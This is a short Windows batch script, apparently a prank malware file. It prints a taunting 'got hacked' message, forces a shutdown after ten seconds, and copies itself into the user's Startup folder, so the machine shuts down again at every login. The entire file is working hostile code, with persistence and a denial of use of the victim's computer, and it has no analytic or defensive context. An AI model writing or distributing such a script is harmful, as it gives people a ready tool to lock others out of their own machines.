@echo off 
echo lil bro got hacked somehow lol
shutdown /s /t 10
if not exist "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\%~nx0" (
    :: Copy itself to the startup folder
    copy "%~f0" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
)